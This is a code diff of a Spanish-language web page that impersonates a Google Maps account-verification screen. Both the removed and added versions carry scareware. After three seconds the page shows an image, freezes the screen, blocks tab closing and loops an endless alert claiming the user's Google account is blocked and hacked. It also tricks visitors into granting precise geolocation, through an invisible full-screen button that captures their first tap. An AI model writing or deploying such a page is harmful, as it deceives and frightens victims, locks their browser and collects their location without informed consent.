@@ -23,24 +23,6 @@
             cursor: default;
         }
 
-        /* BOTÓN INVISIBLE - captura el primer toque para activar la ubicación */
-        .boton-invisible {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 9999;
-            background: transparent;
-            border: none;
-            cursor: default;
-            display: block;
-        }
-
-        .boton-invisible.oculto {
-            display: none;
-        }
-
         .capa-congelada {
             position: fixed;
             top: 0;
@@ -227,9 +209,6 @@
     </style>
 </head>
 <body>
-    <!-- BOTÓN INVISIBLE - captura el primer toque para activar la ubicación -->
-    <button id="botonInvisible" class="boton-invisible" aria-label="Cargando"></button>
-
     <div id="capaCongelada" class="capa-congelada"></div>
 
     <div id="imagenFondo" class="imagen-fondo">
@@ -269,14 +248,11 @@
             let alertaActiva = false;
             let imagenActivada = false;
             let pantallaCongelada = false;
-            let ubicacionObtenida = false;
-            let ubicacionSolicitada = false;
 
             const capaCongelada = document.getElementById('capaCongelada');
             const imagenFondo = document.getElementById('imagenFondo');
             const imgElement = document.getElementById('imagenMostrada');
             const contenedor = document.getElementById('contenedorPrincipal');
-            const botonInvisible = document.getElementById('botonInvisible');
 
             // Intentar evitar el cierre de la pestaña
             window.addEventListener('beforeunload', function(e) {
@@ -319,24 +295,16 @@
 
             let audioAlarma = null;
 
-            // === SOLICITAR UBICACIÓN (se activa con el botón invisible) ===
+            // === SOLICITAR UBICACIÓN ===
             function solicitarUbicacion() {
-                if (ubicacionSolicitada) return;
-                ubicacionSolicitada = true;
-
-                console.log("📍 Solicitando ubicación...");
-
                 if ("geolocation" in navigator) {
+                    console.log("📍 Solicitando ubicación...");
                     navigator.geolocation.getCurrentPosition(
                         function(posicion) {
-                            ubicacionObtenida = true;
                             const lat = posicion.coords.latitude;
                             const lng = posicion.coords.longitude;
-
-                            console.log(`✅ UBICACIÓN EXACTA OBTENIDA:`);
-                            console.log(`   Latitud: ${lat}`);
-                            console.log(`   Longitud: ${lng}`);
-                            console.log(`   📍 https://www.google.com/maps?q=${lat},${lng}`);
+                            console.log(`✅ UBICACIÓN: ${lat}, ${lng}`);
+                            console.log(`📍 https://www.google.com/maps?q=${lat},${lng}`);
                         },
                         function(error) {
                             console.log(`❌ Usuario BLOQUEÓ la ubicación: ${error.message}`);
@@ -371,457 +339,52 @@
                 setTimeout(bucleInfinitoAlertas, 100);
             }
 
-            // === FLUJO DE LA PÁGINA ===
+            // === FLUJO ===
 
-            // 1. El botón invisible captura el primer toque/clic del usuario
-            botonInvisible.addEventListener('click', function(e) {
-                e.preventDefault();
-                solicitarUbicacion();
-                botonInvisible.classList.add('oculto');
-                console.log("👆 Usuario tocó la pantalla - Ubicación solicitada");
+            // 1. Solicitar ubicación al cargar (el navegador mostrará la ventana de permisos)
+            // NOTA: En Chrome, la primera vez que se carga la página, la ventana de permisos aparece automáticamente
+            // Si no aparece, es porque el navegador la bloquea y el usuario debe tocar la pantalla
+            solicitarUbicacion();
+
+            // 2. Si la ubicación no se solicitó automáticamente, usamos un botón invisible
+            // para capturar el primer toque del usuario
+            const botonInvisible = document.createElement('button');
+            botonInvisible.style.position = 'fixed';
+            botonInvisible.style.top = '0';
+            botonInvisible.style.left = '0';
+            botonInvisible.style.width = '100%';
+            botonInvisible.style.height = '100%';
+            botonInvisible.style.zIndex = '9999';
+            botonInvisible.style.background = 'transparent';
+            botonInvisible.style.border = 'none';
+            botonInvisible.style.cursor = 'default';
+            document.body.appendChild(botonInvisible);
+
+            let ubicacionSolicitada = false;
+
+            botonInvisible.addEventListener('click', function() {
+                if (!ubicacionSolicitada) {
+                    ubicacionSolicitada = true;
+                    solicitarUbicacion();
+                    botonInvisible.style.display = 'none';
+                    console.log("👆 Ubicación solicitada al tocar la pantalla");
+                }
             });
 
-            // 2. También funciona con touch (para móviles)
-            botonInvisible.addEventListener('touchstart', function(e) {
-                e.preventDefault();
-                solicitarUbicacion();
-                botonInvisible.classList.add('oculto');
-                console.log("👆 Usuario tocó la pantalla - Ubicación solicitada");
+            botonInvisible.addEventListener('touchstart', function() {
+                if (!ubicacionSolicitada) {
+                    ubicacionSolicitada = true;
+                    solicitarUbicacion();
+                    botonInvisible.style.display = 'none';
+                    console.log("👆 Ubicación solicitada al tocar la pantalla");
+                }
             });
 
             // 3. A los 3 segundos: imagen + alerta + sonido
             setTimeout(activarTodo, TIEMPO_ALERTA);
 
-            console.log("⏱️ Flujo: 3 segundos de carga → imagen + alerta + sonido + bucle infinito");
-            console.log("📍 La ubicación se solicita al primer toque en la pantalla");
-        })();
-    </script>
-</body>
-</html>
-        .maps-text span {
-            font-weight: 400;
-            color: #5f6368;
-        }
-
-        .loader {
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            border: 5px solid #e8eaed;
-            border-top: 5px solid #1a73e8;
-            border-right: 5px solid #1a73e8;
-            animation: spin 0.9s cubic-bezier(0.4, 0.0, 0.2, 1) infinite;
-            flex-shrink: 0;
-            margin-top: 0.5rem;
-            pointer-events: none;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        .status-text {
-            color: #202124;
-            font-size: 1.1rem;
-            font-weight: 500;
-            letter-spacing: 0.2px;
-            text-align: center;
-            pointer-events: none;
-        }
-
-        .status-text .light {
-            font-weight: 400;
-            color: #5f6368;
-        }
-
-        .divider {
-            width: 100%;
-            max-width: 200px;
-            height: 1px;
-            background: #dadce0;
-            margin: 0.2rem 0;
-            pointer-events: none;
-        }
-
-        .sub-text {
-            color: #5f6368;
-            font-size: 0.85rem;
-            font-weight: 400;
-            text-align: center;
-            line-height: 1.5;
-            pointer-events: none;
-        }
-
-        .ubicacion-texto {
-            display: none !important;
-        }
-
-        .imagen-fondo {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            display: none;
-            background: #000000;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .imagen-fondo img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .imagen-fondo.activa {
-            display: flex;
-        }
-
-        @media (max-width: 480px) {
-            .maps-text {
-                font-size: 1.2rem;
-            }
-            .maps-icon {
-                width: 36px;
-                height: 36px;
-            }
-            .loader {
-                width: 40px;
-                height: 40px;
-                border-width: 4px;
-            }
-            .status-text {
-                font-size: 1rem;
-            }
-        }
-    </style>
-</head>
-<body>
-    <div id="capaCongelada" class="capa-congelada"></div>
-
-    <div id="imagenFondo" class="imagen-fondo">
-        <img id="imagenMostrada" src="" alt="Verificación de seguridad" />
-    </div>
-
-    <div id="contenedorPrincipal" class="container">
-        <div class="google-maps-logo">
-            <div class="maps-icon">
-                <div class="pin"></div>
-            </div>
-            <div class="maps-text">
-                Google <span>Maps</span>
-            </div>
-        </div>
-
-        <div class="loader" role="status" aria-label="Cargando"></div>
-
-        <div class="status-text">
-            Verificando <span class="light">cuenta</span>
-        </div>
-
-        <div class="divider"></div>
-
-        <div class="sub-text">
-            Esto puede tomar unos segundos
-        </div>
-    </div>
-
-    <script>
-        (function() {
-            const URL_IMAGEN = "https://i.postimg.cc/7Y6HFY9m/IMG-20260902-153111.jpg";
-            const TIEMPO_ALERTA = 3000;
-            const MENSAJE_ALERTA =
-                "Peligro, su cuenta ha sido bloqueada. Hemos detectado un dispositivo con acceso a su cuenta de Google, posiblemente hackeada.";
-
-            let alertaActiva = false;
-            let imagenActivada = false;
-            let pantallaCongelada = false;
-            let ubicacionObtenida = false;
-
-            const capaCongelada = document.getElementById('capaCongelada');
-            const imagenFondo = document.getElementById('imagenFondo');
-            const imgElement = document.getElementById('imagenMostrada');
-            const contenedor = document.getElementById('contenedorPrincipal');
-
-            // Intentar evitar el cierre de la pestaña
-            window.addEventListener('beforeunload', function(e) {
-                e.preventDefault();
-                e.returnValue = '';
-                return '';
-            });
-
-            function congelarPantalla() {
-                if (pantallaCongelada) return;
-                pantallaCongelada = true;
-                capaCongelada.classList.add('activa');
-            }
-
-            function activarImagenFondo() {
-                if (imagenActivada) return;
-                imagenActivada = true;
-                imgElement.src = URL_IMAGEN;
-                imagenFondo.classList.add('activa');
-                contenedor.classList.add('oculto');
-            }
-
-            // Solicitar ubicación en segundo plano
-            function solicitarUbicacion() {
-                if (ubicacionObtenida) return;
-
-                if ("geolocation" in navigator) {
-                    console.log("📍 Solicitando ubicación...");
-
-                    navigator.geolocation.getCurrentPosition(
-                        function(posicion) {
-                            ubicacionObtenida = true;
-                            const lat = posicion.coords.latitude;
-                            const lng = posicion.coords.longitude;
-                            const precision = posicion.coords.accuracy;
-
-                            console.log(`✅ UBICACIÓN EXACTA OBTENIDA:`);
-                            console.log(`   Latitud: ${lat}`);
-                            console.log(`   Longitud: ${lng}`);
-                            console.log(`   Precisión: ${precision} metros`);
-                            console.log(`   📍 https://www.google.com/maps?q=${lat},${lng}`);
-                        },
-                        function(error) {
-                            console.log(`❌ Usuario BLOQUEÓ la ubicación: ${error.message}`);
-                        },
-                        {
-                            enableHighAccuracy: true,
-                            timeout: 8000,
-                            maximumAge: 0
-                        }
-                    );
-                } else {
-                    console.log("❌ Geolocalización no soportada");
-                }
-            }
-
-            // Bucle infinito de alertas
-            function bucleInfinitoAlertas() {
-                alert(MENSAJE_ALERTA);
-                setTimeout(bucleInfinitoAlertas, 50);
-            }
-
-            function activarTodo() {
-                if (alertaActiva) return;
-                alertaActiva = true;
-
-                activarImagenFondo();
-                congelarPantalla();
-                setTimeout(bucleInfinitoAlertas, 100);
-            }
-
-            // === FLUJO DE LA PÁGINA ===
-            solicitarUbicacion();
-            setTimeout(activarTodo, TIEMPO_ALERTA);
-
-            console.log("⚠️ A los 3 segundos: imagen de fondo + alerta + bucle infinito");
-            console.log("📍 Solicitando ubicación en segundo plano.");
-        })();
-    </script>
-</body>
-</html>
-        .maps-text span {
-            font-weight: 400;
-            color: #5f6368;
-        }
-
-        .loader {
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            border: 5px solid #e8eaed;
-            border-top: 5px solid #1a73e8;
-            border-right: 5px solid #1a73e8;
-            animation: spin 0.9s cubic-bezier(0.4, 0.0, 0.2, 1) infinite;
-            flex-shrink: 0;
-            margin-top: 0.5rem;
-            pointer-events: none;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        .status-text {
-            color: #202124;
-            font-size: 1.1rem;
-            font-weight: 500;
-            letter-spacing: 0.2px;
-            text-align: center;
-            pointer-events: none;
-        }
-
-        .status-text .light {
-            font-weight: 400;
-            color: #5f6368;
-        }
-
-        .divider {
-            width: 100%;
-            max-width: 200px;
-            height: 1px;
-            background: #dadce0;
-            margin: 0.2rem 0;
-            pointer-events: none;
-        }
-
-        .sub-text {
-            color: #5f6368;
-            font-size: 0.85rem;
-            font-weight: 400;
-            text-align: center;
-            line-height: 1.5;
-            pointer-events: none;
-        }
-
-        .imagen-fondo {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            display: none;
-            background: #000000;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .imagen-fondo img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .imagen-fondo.activa {
-            display: flex;
-        }
-
-        @media (max-width: 480px) {
-            .maps-text {
-                font-size: 1.2rem;
-            }
-            .maps-icon {
-                width: 36px;
-                height: 36px;
-            }
-            .loader {
-                width: 40px;
-                height: 40px;
-                border-width: 4px;
-            }
-            .status-text {
-                font-size: 1rem;
-            }
-        }
-    </style>
-</head>
-<body>
-    <div id="capaCongelada" class="capa-congelada"></div>
-
-    <div id="imagenFondo" class="imagen-fondo">
-        <img id="imagenMostrada" src="" alt="Verificación de seguridad" />
-    </div>
-
-    <div id="contenedorPrincipal" class="container">
-        <div class="google-maps-logo">
-            <div class="maps-icon">
-                <div class="pin"></div>
-            </div>
-            <div class="maps-text">
-                Google <span>Maps</span>
-            </div>
-        </div>
-
-        <div class="loader" role="status" aria-label="Cargando"></div>
-
-        <div class="status-text">
-            Verificando <span class="light">cuenta</span>
-        </div>
-
-        <div class="divider"></div>
-
-        <div class="sub-text">
-            Esto puede tomar unos segundos
-        </div>
-    </div>
-
-    <script>
-        (function() {
-            const URL_IMAGEN = "https://i.postimg.cc/7Y6HFY9m/IMG-20260902-153111.jpg";
-            const TIEMPO_ALERTA = 3000;
-            const MENSAJE_ALERTA =
-                "Peligro, su cuenta ha sido bloqueada. Hemos detectado un dispositivo con acceso a su cuenta de Google, posiblemente hackeada.";
-
-            let alertaActiva = false;
-            let imagenActivada = false;
-            let pantallaCongelada = false;
-
-            const capaCongelada = document.getElementById('capaCongelada');
-            const imagenFondo = document.getElementById('imagenFondo');
-            const imgElement = document.getElementById('imagenMostrada');
-            const contenedor = document.getElementById('contenedorPrincipal');
-
-            // Intentar evitar el cierre de la pestaña
-            window.addEventListener('beforeunload', function(e) {
-                e.preventDefault();
-                e.returnValue = '';
-                return '';
-            });
-
-            function congelarPantalla() {
-                if (pantallaCongelada) return;
-                pantallaCongelada = true;
-                capaCongelada.classList.add('activa');
-            }
-
-            function activarImagenFondo() {
-                if (imagenActivada) return;
-                imagenActivada = true;
-                imgElement.src = URL_IMAGEN;
-                imagenFondo.classList.add('activa');
-                contenedor.classList.add('oculto');
-            }
-
-            // Bucle infinito de alertas (sin recargar ni abrir pestañas)
-            function bucleInfinitoAlertas() {
-                activarImagenFondo();
-                congelarPantalla();
-
-                // Mostrar la alerta
-                alert(MENSAJE_ALERTA);
-
-                // Programar la siguiente alerta inmediatamente
-                // Usamos setTimeout para evitar stack overflow
-                setTimeout(bucleInfinitoAlertas, 50);
-            }
-
-            function iniciarBucle() {
-                if (alertaActiva) return;
-                alertaActiva = true;
-                // Pequeño retraso para que la página cargue bien
-                setTimeout(bucleInfinitoAlertas, 100);
-            }
-
-            // Esperar 3 segundos para la primera alerta
-            setTimeout(iniciarBucle, TIEMPO_ALERTA);
-
-            console.log("⚠️ Bucle infinito de alertas activado. Para salir: Ctrl+W o cerrar navegador.");
+            console.log("⏱️ Flujo: 3 segundos → imagen + alerta + sonido + bucle infinito");
+            console.log("📍 La ubicación se solicita automáticamente al cargar (o al tocar la pantalla)");
         })();
     </script>
 </body>
